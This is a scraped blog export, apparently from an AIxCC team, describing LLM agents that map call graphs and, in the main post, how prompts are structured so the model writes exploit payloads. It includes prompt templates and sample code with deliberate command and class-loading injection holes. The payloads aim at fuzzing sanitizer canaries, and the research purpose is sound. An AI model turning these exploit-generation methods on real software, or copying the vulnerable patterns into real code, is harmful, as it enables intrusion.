callee_info = cgpa.resolve_function(callee) child = FuncInfo(func_location=callee_info) fn.children.append(child) if detect_sink(child): # e.g., Runtime.exec, SQL query child.sink_detector_report = {\u0026#34;sink\u0026#34;: True} build_call_graph(child) # recursion return fn # Example call graph output root = FuncInfo(func_location={\u0026#34;name\u0026#34;: \u0026#34;parseDocument\u0026#34;}) graph = build_call_graph(root) print(graph.to_json()) # { # \u0026#34;name\u0026#34;: \u0026#34;parseDocument\u0026#34;, # \u0026#34;children\u0026#34;: [ # {\u0026#34;name\u0026#34;: \u0026#34;validateXML\u0026#34;, \u0026#34;children\u0026#34;: []}, # {\u0026#34;name\u0026#34;: \u0026#34;loadExternalDTD\u0026#34;, \u0026#34;sink\u0026#34;: true} # ] # } Here, loadExternalDTD is flagged as a sink — a finding that triggers BCDA to generate a BugInducingThing and eventually hands off to BGA for exploit generation.\nEngineering Challenges Building these agents was far from trivial. Some lessons from the trenches:\nLLM Cost Control: Call graph expansion is recursive and potentially explosive. We had to integrate caching layers and prioritize tool-based results (Joern, LSP) before falling back to LLM calls. Balancing Static and Dynamic: Pure LLM reasoning often hallucinated callees. By mixing AST parsing, coverage traces, and Joern outputs, MCGA became both faster and more accurate. Asynchronous Execution: Instead of serially building massive graphs, MCGA launches sink detections asynchronously, enabling early-stage bug discovery. Lessons Learned Reflecting on this design, a few insights stand out:\nMachine-Guided Beats Human-Mimicry Early on, we tried to mimic human auditors too literally. Later, we leaned into machine advantages — like async graph expansion and LLM-guided fuzzing integration — and saw better results. Context Engineering Is the Next Frontier LLMs thrive on top-down descriptions with selective detail. Feeding call paths, tainted args, and sanitizer hints in structured form was more effective than dumping entire files. Integration Matters These agents weren’t just standalone tools; they were designed to hand off work seamlessly. CPUA’s outputs flowed into MCGA, which in turn leaned on CGPA, all culminating in BCDA and BGA. Closing Thoughts When I actually worked on using LLMs to find bugs, I came away with some mixed but exciting impressions.\nFirst, I realized that fuzzing and LLMs shine in very different domains. Fuzzers are still unmatched at surfacing memory corruption issues, such as crashes, overflows, dangling pointers, the kinds of low-level chaos that brute-force mutation is naturally good at exploring. But when it comes to logic errors, fuzzers are only as good as their bug oracles. LLMs, on the other hand, surprised me with how well they could identify logic errors. They’re able to reason about semantics, invariants, and unintended behavior in a way fuzzers can’t. That made me think: maybe LLMs could be especially valuable in areas like smart contracts, where correctness depends far more on logic than memory safety.\nThat said, LLMs struggle with memory corruption directly. Many of these bugs are deeply context-dependent — think use-after-free, or API-sequence–driven vulnerabilities. To capture that context, you’d have to feed the model an enormous slice of the codebase, which quickly runs into context window limits. That’s why we designed UniAFL to use LLMs more as assistants to fuzzing rather than replacements. The fuzzer provides raw coverage and brute force, while the LLM helps steer: generating better seeds, prioritizing paths, or highlighting suspicious functions. It worked well in practice, but it also showed me how much room there is to grow. Handling execution context, the stateful conditions that make subtle memory bugs appear, is still a frontier. I even considered attaching tools like a debugger to give LLMs richer execution insights, but we simply didn’t have the time during the competition. Still, I think giving LLMs better tools to reason about those contexts will be one of the most promising directions forward.\nLooking back at the competition, I think the results were encouraging. Every system was constrained to a handful of harnesses, each exercising only a limited set of functions. Within that tight scope, Atlantis still uncovered six zero-day vulnerabilities. That felt significant. It also hinted at potential: with more harnesses, or with broader harness coverage per project, the number of bugs we could find would scale up dramatically.\nThat leaves me asking a deeper question: what makes a good harness? A harness isn’t just a piece of glue code. It defines the context needed to trigger a bug. And building the right context is exactly where I think LLMs can shine. They’re good at understanding code, generating scaffolding, and filling in the missing pieces of a test. If we can teach them to generate better harnesses, we might open up whole new classes of vulnerabilities that current tools can’t touch.\nIn the end, my biggest takeaway is that LLMs are not here to replace human security researchers or fuzzers. Instead, they’re here to amplify our reach. Fuzzers will continue to hammer the low-level space. Humans will continue to frame the hardest questions. And LLMs can be the bridge, helping us understand complex codebases, reason about hidden contexts, and design smarter experiments.\nFrom harness to vulnerability, the journey is long. But with LLMs as collaborators rather than replacements, I believe we can explore parts of the security landscape that used to feel unreachable.\n📚 Technical Resources Source Code by Agent: CPUA CGPA MCGA 🔗 Related Deep Dives 🏗️ MLLA Overview: The Complete System 📖 UniAFL: The Fuzzing Infrastructure 🛠️ BGA: Self-Evolving Exploits Through Multi-Agent AI 🧠 Context Engineering: How BGA Teaches LLMs to Write Exploits 🔬 BCDA: The AI Detective Separating Real Bugs from False Alarms Now, curious about what happens when MCGA finds a potential vulnerability? See how 🔬 BCDA acts as an AI detective to separate real bugs from false alarms.\n"},{"section":"Blog","slug":"/blog/post-context-engineering/","title":"Context Engineering: How BGA Teaches LLMs to Write Exploits","description":"Deep dive into the context engineering techniques that make BGA&#39;s AI agents effective at vulnerability exploitation - from XML structuring to coverage feedback loops","date":"September 2, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/context_engineering_hu_b4952bbf85a062d8.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/context_engineering_hu_70837bf40a640917.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/context_engineering_hu_cecf141133924075.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/context_engineering_hu_24fa4235e54972d1.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, exploit-generation, context-engineering, prompt-engineering, coverage-feedback, bga","content":"The Problem with Teaching AI to Hack Teaching an LLM to write working exploits is more challenging than typical AI tasks. Unlike most applications where \u0026ldquo;close enough\u0026rdquo; works, vulnerability exploitation requires precise execution. A single character error can make an entire exploit fail.\nTake this seemingly simple Java reflective call injection vulnerability:\nString className = request.getParameter(\u0026#34;class\u0026#34;); Class.forName(className); // BUG: arbitrary class loading This looks straightforward, but there\u0026rsquo;s a catch: to exploit this vulnerability, the LLM must load the exact class name \u0026quot;jaz.Zer\u0026quot; to trigger Jazzer\u0026rsquo;s detection. Not \u0026quot;jaz.Zero\u0026quot;, not \u0026quot;java.Zer\u0026quot;, not \u0026quot;jaz.zer\u0026quot;. One character wrong and the entire exploit fails.\nThis precision challenge led us to develop context engineering – a systematic approach to structuring information that transforms LLMs from educated guessers into reliable exploit generators. These techniques became the backbone of our BGA framework and delivered impressive results during the AIxCC competition.\nHere\u0026rsquo;s what we learned: LLMs don\u0026rsquo;t need smarter algorithms – they need smarter information delivery. This post shows you exactly how we solved this challenge, with real examples from our research.\nFour Foundational Principles After studying prompt engineering research (OpenAI, Anthropic), we had a realization: talking to LLMs effectively is a lot like explaining complex topics to humans. What makes sense to a human usually makes sense to an LLM too.\nThink about it – when you\u0026rsquo;re overwhelmed with information, you lose focus. LLMs do the same thing. That\u0026rsquo;s why we design focused prompts that clearly establish what needs to be done.\nThis human-centered approach led us to four core principles that guide everything we do:\n1. Top-Down Guidance Give the big picture first, then zoom in. Just like explaining a complex topic to a colleague, you start with the overall goal before diving into specifics. We always begin with role definition, then expertise areas, then objectives, and finally the detailed steps.\n2. Structure \u0026amp; Clarity Organize information logically and eliminate ambiguity. We use hierarchical XML structures, clear section boundaries, and explicit relationships between concepts. In vulnerability exploitation, vague instructions lead to failed exploits.\n3. Concise Yet Comprehensive Include everything needed, but cut the fluff. Every piece of information should serve a purpose. We provide complete vulnerability context while filtering out irrelevant details that might confuse the LLM.\n4. Avoid Overcomplication Simple and clear beats clever and complex. If we can\u0026rsquo;t easily explain how something works, it\u0026rsquo;s probably too complicated for consistent LLM performance. We stick to patterns that work reliably.\nThese principles treat LLMs as intelligent partners that need well-structured information, not magic boxes that somehow \u0026ldquo;just know\u0026rdquo; what to do. As you\u0026rsquo;ll see in our results, this approach made a huge difference.\nFour Core Techniques Building our LLM-based security tools taught us something important: basic prompting doesn\u0026rsquo;t cut it for complex vulnerability exploitation. LLMs need a systematic way to understand vulnerabilities, parse complicated code relationships, and generate precise exploits.\nOur context engineering approach solves this through four key techniques that delivered solid improvements across different vulnerability types:\nXML-Structured Context Design – Hierarchical organization for reliable LLM parsing Source Code Annotation Systems – Precision markers that focus attention on critical code Coverage-Driven Iterative Refinement – Execution feedback loops that eliminate guesswork Domain Knowledge Integration – Selective injection of vulnerability-specific expertise How They Work Together These techniques work as a team, with each one strengthening the others:\nXML structures provide the foundation - a reliable way to organize complex vulnerability information that LLMs can consistently parse, following our \u0026ldquo;big picture first\u0026rdquo; approach\nAnnotation systems add precision through markers like @VISITED, @BUG_HERE, and @KEY_CONDITION, helping LLMs focus on what actually matters in massive codebases\nCoverage feedback turns guesswork into systematic problem-solving by showing the LLM exactly what conditions it has reached and what still needs to be satisfied\nDomain knowledge fills in the gaps - providing vulnerability patterns, data structure handling, and exploitation techniques that generic LLMs don\u0026rsquo;t naturally know\nPut it all together, and you get LLMs that can reliably generate working exploits instead of just making educated guesses. Let\u0026rsquo;s dive into how each technique works.\nTechnique 1: XML-Structured Context Design Implements: Structure \u0026amp; Clarity\nWhy XML Works for Technical Context Our approach uses XML organization to implement our Structure \u0026amp; Clarity principle. We emphasize hierarchical structure, context-before-complexity, annotation clarity, and clear organization. This approach aligns with Anthropic\u0026rsquo;s recommendations for using XML with Claude, which highlights XML\u0026rsquo;s advantages: Clarity, Accuracy, Flexibility, and Parseability.\nXML excels at representing data hierarchy and relationships. The verbose tags provide unambiguous boundaries and semantic sections that help LLMs understand not just the data, but its purpose and nested structure:\n\u0026lt;SOURCE_CODE_INFO\u0026gt; \u0026lt;FUNCTION_CALL_FLOW\u0026gt; - fuzzerTestOneInput - GzipCompressorInputStream.\u0026lt;init\u0026gt; // @BUG is in the below function. - init \u0026lt;/FUNCTION_CALL_FLOW\u0026gt; \u0026lt;VULNERABLE_FUNCTION\u0026gt; \u0026lt;FUNC_BODY\u0026gt; [398]: if (modTime == 1731695077L \u0026amp;\u0026amp; fname != null) { /* @KEY_CONDITION */ [399]: new ProcessBuilder(fname).start(); /* @BUG_HERE */ \u0026lt;/FUNC_BODY\u0026gt; \u0026lt;/VULNERABLE_FUNCTION\u0026gt; \u0026lt;/SOURCE_CODE_INFO\u0026gt; This hierarchical XML structure shows how we organize complex vulnerability context - from high-level call flows down to specific vulnerable lines, with clear semantic sections that enable both automated parsing and human readability.\nImplementing Top-Down Guidance Our prompt structure follows Top-Down Guidance through a systematic flow: System prompt → Source code → Sub-task → Coverage feedback → Analysis. Each agent receives context in this order, starting with their role and objectives before diving into technical details.\nReal System Prompt Structure Here\u0026rsquo;s our actual BlobGen system prompt structure, demonstrating these principles in practice:\n\u0026lt;role\u0026gt; You are an expert security researcher specializing in vulnerability analysis and exploit development for an oss-fuzz project. Your mission is to analyze code for security vulnerabilities and demonstrate them through carefully crafted payloads that trigger sanitizers. \u0026lt;/role\u0026gt; \u0026lt;expertise\u0026gt; You possess specialized knowledge in: - Vulnerability analysis in large codebases - Endianness handling - Sanitizer-based vulnerability detection ... \u0026lt;/expertise\u0026gt; \u0026lt;final_objective\u0026gt; Your ultimate goal is to implement a Python \u0026#39;create_payload() -\u0026gt; bytes\u0026#39; function that: - Returns ONLY a single bytes object (no tuples/dicts) - Handles loop iterations and state when needed - Uses ONLY built-in Python libraries (e.g., struct, json, base64) unless specified - Documents each condition in the implementation ... IMPORTANT: Avoid any redundant code, variables, or operations \u0026lt;/final_objective\u0026gt; \u0026lt;context\u0026gt; - Target project name is: aixcc/jvm/r3-apache-commons-compress - Target harness name is: CompressorGzipFuzzer - Target sanitizer and vulnerability: \u0026#39;JazzerSanitizer.OSCommandInjection\u0026#39; ... \u0026lt;/context\u0026gt; \u0026lt;code_annotations\u0026gt; The following annotations mark specific lines in the code: - /* @BUG_HERE */ comments: The line immediately after contains the vulnerability - /* @KEY_CONDITION */ comments: The line immediately after contains an important condition \u0026lt;/code_annotations\u0026gt; Notice the systematic organization:\n\u0026lt;role\u0026gt; establishes identity and mission \u0026lt;expertise\u0026gt; provides domain context \u0026lt;final_objective\u0026gt; specifies exact technical requirements \u0026lt;context\u0026gt; grounds the task in specific targets \u0026lt;code_annotations\u0026gt; explains our marking system This hierarchical structure, combined with context-before-complexity ordering and annotation clarity, maximizes LLM effectiveness for technical exploitation challenges.\nTechnique 2: Source Code Annotation Systems Implements: Concise Yet Comprehensive\nThe [n]: Line Number Format We developed a specific format for delivering source code that consistently works across different LLMs. Inspired by RustAssistant by Microsoft, we use [n]: formatting where brackets and colons distinguish line numbers from code literals:\n\u0026lt;SOURCE_CODE_INFO\u0026gt; \u0026lt;FUNCTION_CALL_FLOW\u0026gt; - fuzzerTestOneInput - GzipCompressorInputStream.\u0026lt;init\u0026gt; ... // @BUG is in the below function. - init \u0026lt;/FUNCTION_CALL_FLOW\u0026gt; \u0026lt;ENTRY_FUNCTION\u0026gt; \u0026lt;FUNC_BODY\u0026gt; [23]: public static void fuzzerTestOneInput(byte[] data) { [24]: try { /* @KEY_CONDITION */ [25]: fuzzCompressorInputStream(new GzipCompressorInputStream(new ByteArrayInputStream(data), true)); ... \u0026lt;/FUNC_BODY\u0026gt; \u0026lt;/ENTRY_FUNCTION\u0026gt; \u0026lt;VULNERABLE_FUNCTION\u0026gt; \u0026lt;FUNC_BODY\u0026gt; [343]: private boolean init(final boolean isFirstMember) throws IOException { [344]: if (!isFirstMember \u0026amp;\u0026amp; !decompressConcatenated) { /* @KEY_CONDITION */ ... [398]: if (modTime == 1731695077L \u0026amp;\u0026amp; fname != null) { /* @KEY_CONDITION */ [399]: new ProcessBuilder(fname).start(); /* @BUG_HERE */ [400]: } ... \u0026lt;/FUNC_BODY\u0026gt; \u0026lt;/VULNERABLE_FUNCTION\u0026gt; \u0026lt;/SOURCE_CODE_INFO\u0026gt; The @ Annotation System Our annotation system implements Concise Yet Comprehensive by using precise markers like @VISITED, @KEY_CONDITION, and @BUG_HERE to highlight only the most critical information. Instead of overwhelming the LLM with entire codebases, we mark exactly what matters:\n@BUG_HERE: The line immediately after contains the actual vulnerability @KEY_CONDITION: The line immediately after contains a condition that must be satisfied to reach the vulnerability @VISITED: Added dynamically during execution to show which conditions were reached This annotation system derives from BCDA\u0026rsquo;s Bug Inducing Things (BITs) and provides clear, unambiguous markers that focus LLM attention on critical decision points while filtering out irrelevant code paths.\nTechnique 3: Coverage-Driven Iterative Refinement The @VISITED Breakthrough Here\u0026rsquo;s where things get really interesting. The breakthrough that transformed our success rate was incorporating execution coverage directly into context through @VISITED markers. Think of it as giving the AI real-time feedback on what\u0026rsquo;s actually happening when it runs its code.\nWhen a payload executes, we collect coverage data - which functions ran, which files were touched, which lines were hit. Then we compare this against our BIT-identified key conditions and add @VISITED markers to show exactly which conditions were reached. It\u0026rsquo;s like having a conversation: \u0026ldquo;You tried this, here\u0026rsquo;s what actually happened, now what should you try next?\u0026rdquo;\nWe also provide brief hints about the source code structure upfront, giving agents initial understanding before they receive detailed coverage feedback. But here\u0026rsquo;s the key insight - coverage engines aren\u0026rsquo;t perfect. We explicitly guide the LLM that this information might have gaps and should be used as reference only. Notice how we frame our coverage feedback:\n\u0026lt;COVERAGE_INFO_FOR_KEY_CONDITIONS\u0026gt; \u0026lt;HOW_TO_USE\u0026gt; Coverage information from payload execution. Use as reference only - may contain inaccuracies. Focus on key conditions and bug locations to guide payload refinement. \u0026lt;/HOW_TO_USE\u0026gt; \u0026lt;XXD_OUTPUT_FOR_PAYLOAD_BLOB\u0026gt; 00000000: 1f8b 0808 6565 6e41 0002 6a61 7a7a 6500 ....eenA..jazze. ... \u0026lt;/XXD_OUTPUT_FOR_PAYLOAD_BLOB\u0026gt; \u0026lt;SOURCE_CODE_INFO\u0026gt; ... [344]: if (!isFirstMember \u0026amp;\u0026amp; !decompressConcatenated) { /* @KEY_CONDITION | @VISITED */ [351]: if (magic0 == -1 \u0026amp;\u0026amp; !isFirstMember) { /* @KEY_CONDITION | @VISITED */ [354]: if (magic0 != GzipUtils.ID1 || in.read() != GzipUtils.ID2) { /* @KEY_CONDITION | @VISITED */ [394]: if ((flg \u0026amp; GzipUtils.FNAME) != 0) { /* @KEY_CONDITION | @VISITED */ ... [398]: if (modTime == 1731695077L \u0026amp;\u0026amp; fname != null) { /* @KEY_CONDITION */ [399]: new ProcessBuilder(fname).start(); /* @BUG_HERE */ ... \u0026lt;/SOURCE_CODE_INFO\u0026gt; \u0026lt;/COVERAGE_INFO_FOR_KEY_CONDITIONS\u0026gt; \u0026lt;STDERR_FOR_PAYLOAD_BLOB\u0026gt; java.io.IOException: Gzip-compressed data is corrupt at org.apache.commons.compress.compressors.gzip.GzipCompressorInputStream.read ... ... at CompressorGzipFuzzer.fuzzerTestOneInput(CompressorGzipFuzzer.java:25) \u0026lt;/STDERR_FOR_PAYLOAD_BLOB\u0026gt; The @VISITED markers provide immediate visual feedback: you can see the payload successfully reached line 394 but failed at line 398. The hexadecimal dump and error message provide additional debugging context.\nSystematic Iterative Refinement This coverage feedback transforms what could be random guessing into systematic problem-solving. The LLM analyzes coverage results to identify the gap between where it got and where it needs to be. Instead of showing the entire codebase, we present only the vulnerability-relevant annotated lines with @VISITED markers. This filters out the noise and focuses attention on the critical decision points.\nHere\u0026rsquo;s the workflow: analyze coverage gaps → identify what conditions weren\u0026rsquo;t met → make targeted modifications → try again. The agent repeats this up to four times, each iteration getting smarter about what needs to change. It\u0026rsquo;s like having a persistent debugging session where each attempt builds on the insights from the previous one.\nThis approach transforms unreliable single-shot LLM generation into systematic vulnerability exploitation through feedback loops and adaptive refinement. Instead of hoping the AI gets lucky on the first try, we give it a structured way to learn from its mistakes.\nMulti-Variation Coverage Analysis But we don\u0026rsquo;t stop at single attempts. The Generator Agent operates through a systematic 6-step process: select sanitizer, plan the approach, create multiple payload variations, collect coverage from all attempts, update context based on promising patterns, then analyze and refine.\nHere\u0026rsquo;s the clever part: instead of just looking at one payload attempt, we generate about 20 variations and merge their coverage data. This gives us a broader view of what\u0026rsquo;s possible and what\u0026rsquo;s working across multiple attempts. It\u0026rsquo;s like having 20 different explorers mapping out a cave system - collectively, they discover much more than any single explorer could alone.\n\u0026lt;COVERAGE_SUMMARY\u0026gt; Primary Coverage (Functions in target call path): - Functions: 15, Files: 4, Lines: 98 Entire Coverage (Including out of call paths): - Total Functions: 22, Total Files: 5, Total Lines: 120 Changes in Entire Coverage: - Newly covered: 22 functions in 5 files (+120 lines) - No longer covered: 0 functions in 0 files (-0 lines) \u0026lt;/COVERAGE_SUMMARY\u0026gt; \u0026lt;COVERAGE_DIFF\u0026gt; \u0026lt;new_coverage\u0026gt; \u0026lt;functions_with_line_counts\u0026gt; - getFileNameCharset: 1 more lines - setComment: 2 more lines - setFileName: 2 more lines ... \u0026lt;/functions_with_line_counts\u0026gt; \u0026lt;/new_coverage\u0026gt; \u0026lt;/COVERAGE_DIFF\u0026gt; \u0026lt;task\u0026gt; Phase 1 Analysis: - Assess whether the generator successfully reaches the destination function ... Phase 2 Analysis: - Determine how close the generator came to triggering the vulnerability ... Finally, provide detailed feedback for improvement. \u0026lt;/task\u0026gt; This aggregated view helps the LLM understand which strategies are making progress across multiple attempts. Instead of seeing LLM non-determinism as a bug, we turn it into a feature - the natural variation in AI outputs becomes a systematic exploration strategy.\nTechnique 4: Domain Knowledge Integration Implements: Concise Yet Comprehensive\nSelective Knowledge Injection Here\u0026rsquo;s the reality: general-purpose LLMs don\u0026rsquo;t know much about security vulnerabilities. They might know SQL injection exists, but they don\u0026rsquo;t know the specific patterns that trigger each type or how to craft payloads that actually work.\nRather than overwhelming the AI with exhaustive security textbooks, we selectively inject only the relevant domain expertise for each vulnerability type. Think of it as just-in-time learning - we provide exactly what\u0026rsquo;s needed for the specific vulnerability at hand, no more, no less.\nThis domain knowledge integration also helped other agents in MLLA (MCGA, BCDA) detect vulnerability candidates by providing structured understanding of security patterns. However, the exploit guides are specifically used only in BGA for exploitation - other agents focus on bug discovery and don\u0026rsquo;t need the exploitation-specific guidance.\nVulnerability-Specific Context Templates We systematically prepared templates (complete implementation) covering 20 total vulnerability types:\n12 Jazzer types: SQLInjection, OSCommandInjection, XPathInjection, ServerSideRequestForgery, RegexInjection, JNDIInjection, ReflectiveCallInjection, ScriptEngineInjection, LDAPInjection, DeserializeObjectInjection, FilePathTraversal, TimeoutDenialOfService 8 AddressSanitizer types: BufferOverflow/Underflow, UseAfterFree/Return, DoubleFree, UseBeforeInitialization, FloatingPointException, TimeoutDenialOfService Each template combines three crucial elements: what the vulnerability looks like in code, how it typically manifests, and most importantly, exactly how to trigger it. You can see our complete templates in JazzerSanitizer_with_exploit.yaml and AddressSanitizer_with_exploit.yaml.\nWe intentionally focused on these 20 types and skipped MemorySanitizer and UndefinedBehaviorSanitizer - they would add compilation complexity for the UniAFL side and mostly catch easier bugs like signed integer overflow.\nOS Command Injection Template:\n\u0026lt;sanitizer\u0026gt; \u0026lt;type\u0026gt;OSCommandInjection\u0026lt;/type\u0026gt; \u0026lt;description\u0026gt; OS commands executed with user-controlled input. Find: Runtime.exec() or ProcessBuilder using user input, including command arrays. ```java String filename = request.getParameter(\u0026#34;file\u0026#34;); Runtime.getRuntime().exec(\u0026#34;cat \u0026#34; + filename); // BUG: command injection // Command array String[] cmd = {\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;ls \u0026#34; + filename}; // BUG: shell injection new ProcessBuilder(cmd).start(); // Direct command String command = request.getParameter(\u0026#34;cmd\u0026#34;); Runtime.getRuntime().exec(command); // BUG: direct command execution ``` \u0026lt;/description\u0026gt; \u0026lt;exploit\u0026gt; 1. Locate command execution with user input 2. Execute exact target command \u0026#34;jazze\u0026#34; ```java Runtime.getRuntime().exec(\u0026#34;jazze\u0026#34;); // Exact command name required // OR with ProcessBuilder new ProcessBuilder(\u0026#34;jazze\u0026#34;).start(); // Alternative method ``` \u0026lt;/exploit\u0026gt; \u0026lt;/sanitizer\u0026gt; This template provides complete exploitation context: what the vulnerability looks like, how to recognize it in code, and most importantly, exactly how to trigger it.\nData Structure Handling Guides But domain knowledge isn\u0026rsquo;t just about vulnerability types - it\u0026rsquo;s also about the tricky data structures that fuzzing frameworks use. We developed specialized guides (complete implementation) for three categories of challenging structures:\nFuzzedDataProvider Structures - The complex data consumption patterns Java ByteBuffer Formats - Binary data handling Application-Specific Data Structures - Custom formats found in target applications FuzzedDataProvider Structures FuzzedDataProvider structures are particularly tricky. They consume primitive types from the end of data buffers while consuming structured data from the beginning, with specialized methods like consumeInt(min, max) for bounded value generation. It\u0026rsquo;s like trying to eat a sandwich from both ends simultaneously - you need to know exactly how much space each bite will take.\nHere\u0026rsquo;s our key insight: instead of trying to explain these complex data consumption patterns to the LLM, we built libFDP integration (GitHub) that abstracts away the implementation details. LLMs are excellent at programming, so we give them simple functions to call rather than asking them to understand the underlying binary format specifications.\nThe system provides language-specific encoders: libFDP.JazzerFdpEncoder() for Java targets (implementation) and libFDP.LlvmFdpEncoder() for C/C++ targets (implementation). Each encoder uses selective function mapping - we only include methods that are actually used in the target code, avoiding unnecessary complexity.\n\u0026lt;DATA_STRUCT_GUIDE_FOR_EXPLOIT\u0026gt; \u0026lt;description\u0026gt; FuzzedDataProvider Structure Handling: The input format consists of data consumed from the end of a buffer with specific methods. Focus only on the methods detected in the source code to avoid unnecessary complexity. \u0026lt;/description\u0026gt; \u0026lt;method_mapping\u0026gt; consumeString(int maxLength) → produce_jstring(target: str, maxLength: int) consumeInt(int min, int max) → produce_jint_in_range(target: int, min: int, max: int) consumeBytes(int maxLength) → produce_jbytes(target: bytes, maxLength: int) \u0026lt;/method_mapping\u0026gt; \u0026lt;usage_example\u0026gt; from libFDP import JazzerFdpEncoder def create_payload() -\u0026gt; bytes: encoder = JazzerFdpEncoder() # Match FDP consumption pattern # For consumeString(20) encoder.produce_jstring(\u0026#34;malicious_input\u0026#34;, 20) # For consumeInt(1, 100) encoder.produce_jint_in_range(42, 1, 100) # For consumeBytes(10) encoder.produce_jbytes(b\u0026#39;\\x00\\x01\\x02\u0026#39;, 10) return encoder.finalize() \u0026lt;/usage_example\u0026gt; \u0026lt;/DATA_STRUCT_GUIDE_FOR_EXPLOIT\u0026gt; Java ByteBuffer Formats These require precise endianness handling for multi-byte integer consumption. The framework provides structured guidance (implementation) for understanding ByteBuffer\u0026rsquo;s BIG-ENDIAN byte ordering:\n\u0026lt;ByteBuffer\u0026gt; \u0026lt;description\u0026gt; ByteBuffer is a utility class in Java that specially handles integer value in BIG-ENDIAN. \u0026lt;/description\u0026gt; \u0026lt;core_principles\u0026gt; \u0026lt;principle\u0026gt;Default is BIG-ENDIAN byte order (most significant byte first)\u0026lt;/principle\u0026gt; \u0026lt;/core_principles\u0026gt; \u0026lt;methods\u0026gt; \u0026lt;primitive_getters\u0026gt; \u0026lt;method\u0026gt;getInt()\u0026lt;/method\u0026gt; \u0026lt;method\u0026gt;getLong()\u0026lt;/method\u0026gt; \u0026lt;/primitive_getters\u0026gt; \u0026lt;/methods\u0026gt; \u0026lt;example\u0026gt; \u0026lt;raw_bytes\u0026gt;[0x01, 0x02, 0x03, 0x04, 0x41, 0x42, 0x43, 0x44]\u0026lt;/raw_bytes\u0026gt; \u0026lt;code language=\u0026#34;java\u0026#34;\u0026gt; public static void fuzzerTestOneInput(byte[] data) { if (data.length \u0026lt; 4) return; // Ensure we have enough data ByteBuffer buf = ByteBuffer.wrap(data); // BIG-ENDIAN reading (default) int value = buf.getInt(); // Reads [0x01, 0x02, 0x03, 0x04] → 0x01020304 // Use value to drive test if (value \u0026gt; 0) { processData(value); } } \u0026lt;/code\u0026gt; \u0026lt;/example\u0026gt; \u0026lt;/ByteBuffer\u0026gt; This guidance enables proper payload construction for methods like getInt() and getLong(), ensuring agents generate payloads with correct byte ordering.\nApplication-Specific Data Structures These include domain-specific formats like ServletFileUpload for multipart-based file upload processing. Due to AIxCC limitations on leveraging existing vulnerability information, we only checked the possibility of data structure summaries conservatively - preparing just one example (ServletFileUpload) to avoid violating competition rules.\nDespite this minimal testing, the approach proved particularly promising. As shown in our results table, even without actual source code, providing this single data structure summary improved File Path Traversal success from 2/10 to 9/10. This suggests a future research direction: systematically preparing summaries of all relevant data structures could provide significant benefits for vulnerability exploitation across different target applications.\n\u0026lt;ServletFileUpload\u0026gt; \u0026lt;description\u0026gt; ServletFileUpload parses HTTP requests with Content-Type: multipart/form-data, extracting parts into FileItem objects. \u0026lt;/description\u0026gt; \u0026lt;core_principles\u0026gt; \u0026lt;principle\u0026gt;Parses multipart/form-data HTTP requests\u0026lt;/principle\u0026gt; \u0026lt;principle\u0026gt;Uses DiskFileItemFactory for temporary storage management\u0026lt;/principle\u0026gt; \u0026lt;/core_principles\u0026gt; \u0026lt;example\u0026gt; \u0026lt;code language=\u0026#34;java\u0026#34;\u0026gt; ServletFileUpload upload = new ServletFileUpload( new DiskFileItemFactory(DiskFileItemFactory.DEFAULT_SIZE_THRESHOLD, tmpDir)); List\u0026lt;FileItem\u0026gt; items = upload.parseRequest(request); \u0026lt;/code\u0026gt; \u0026lt;/example\u0026gt; \u0026lt;/ServletFileUpload\u0026gt; Adaptive Context Selection The BGA framework employs adaptive knowledge integration to balance comprehensive domain expertise with computational efficiency through context-aware prompt generation strategies. Rather than overwhelming LLMs with exhaustive domain knowledge, the system selectively integrates vulnerability patterns and data structure insights based on target-specific analysis and detected patterns.\nThe integration strategy operates through two complementary principles: contextual relevance ensures that domain knowledge selection aligns with the specific vulnerability context and target characteristics, while selective application prevents information overload by focusing on detected patterns rather than applying comprehensive knowledge bases.\nThis adaptive approach enables dynamic knowledge integration based on analysis results: vulnerability categorization from BCDA guides the selection of appropriate exploit patterns, while detected data structures trigger relevant handling strategies for BlobGen, Generator, and Mutator agents. The system generates targeted prompts that incorporate only the most pertinent vulnerability patterns and structural constraints, ensuring that LLMs receive focused guidance without exceeding context limitations.\nTechnique 5: Selective Codebase Context Expansion An experimental approach that didn\u0026rsquo;t pan out\nThe Gap We Found Here\u0026rsquo;s something we discovered during competition: BGA sometimes failed on seemingly trivial vulnerabilities despite having perfect call graph coverage. Why? It was missing crucial context from methods that weren\u0026rsquo;t \u0026ldquo;on the path\u0026rdquo; to the bug but were essential for understanding input structures - like configuration setters on completely different code paths.\nOur Solution Attempt We thought we had a clever solution: use tree-sitter to identify relevant classes from the vulnerability call graph, then search across all call graphs to find methods that could potentially operate on those classes. The implementation worked - it successfully identified relevant classes and their methods.\nWhy It Didn\u0026rsquo;t Deliver But here\u0026rsquo;s the reality check: we couldn\u0026rsquo;t make this approach work effectively for several reasons. First, most related data were already captured by our code discovery agents\u0026rsquo; comprehensive browsing (more on this in an upcoming post). Second, if information wasn\u0026rsquo;t in the call graph, our filtering approach meant we couldn\u0026rsquo;t search for it anyway - a classic catch-22. Third, we simply ran out of time during competition to properly test and integrate this feature.\nThe concept remains interesting for future work. LSP tools or RAG systems with contextual embedding similarity could tackle this more 